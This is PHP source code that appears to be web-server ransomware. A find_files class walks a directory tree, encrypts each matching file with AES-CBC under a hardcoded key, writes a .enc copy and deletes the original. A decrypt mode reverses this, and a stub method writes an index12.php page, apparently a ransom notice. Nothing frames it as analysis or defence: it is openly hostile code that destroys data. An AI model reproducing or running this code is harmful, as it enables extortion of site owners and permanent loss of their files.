class Encryption {
    const CIPHER = MCRYPT_RIJNDAEL_128;
    const MODE   = MCRYPT_MODE_CBC;

    /* Cryptographic key of length 16, 24 or 32. NOT a password! */
    private $key;
    public function __construct($key) {
        $this->key = $key;
    }

    public function encrypt($plaintext) {
        $ivSize = mcrypt_get_iv_size(self::CIPHER, self::MODE);
        $iv = mcrypt_create_iv($ivSize, MCRYPT_DEV_RANDOM);
        $ciphertext = mcrypt_encrypt(self::CIPHER, $this->key, $plaintext, self::MODE, $iv);
        return base64_encode($iv.$ciphertext);
    }

    public function decrypt($ciphertext) {
        $ciphertext = base64_decode($ciphertext);
        $ivSize = mcrypt_get_iv_size(self::CIPHER, self::MODE);
        if (strlen($ciphertext) < $ivSize) {
            throw new Exception('Missing initialization vector');
        }

        $iv = substr($ciphertext, 0, $ivSize);
        $ciphertext = substr($ciphertext, $ivSize);
        $plaintext = mcrypt_decrypt(self::CIPHER, $this->key, $ciphertext, self::MODE, $iv);
        return rtrim($plaintext, "\0");
    }
}

class find_files {
	public function re2($path, $method, $filetype) {
		$key = "12725848912345128912399678912345";
		$path = new RecursiveDirectoryIterator($path);
		$bytes = 0;
		$nbfiles = 0;
		foreach(new RecursiveIteratorIterator($path) as $filename=>$cur) {
			$filesize=$cur->getSize();
			$bytes+=$filesize;
			$nbfiles++;
			if($filetype == "*" || strpos($filename, $filetype)) {
				$crypt = new Encryption($key);
				if($method == "enc") {
					$outfile = fopen($filename . ".enc", "w");
					$contents = base64_encode(file_get_contents($filename));
					$contents = $crypt->encrypt($contents);
					fwrite($outfile, $contents);
					fclose($outfile);
					unlink($filename);
				} elseif($method == "dec") {
					if(strpos($filename, ".enc")) {
						$filename2 = preg_replace('/.enc$/', '', $filename);
						$outfile = fopen($filename2, "w");
						$contents = file_get_contents($filename);
						$contents = $crypt->decrypt($contents);
						$contents = base64_decode($contents);
						fwrite($outfile, $contents);
						fclose($outfile);
						unlink($filename);
					}
				}
			}
		}
		echo "</br>Finished.";
	}
	public function pun() {
		$file = fopen("index12.php", "w");
		fwrite($file, base64_decode(""));
		fclose($file);	
	}
}

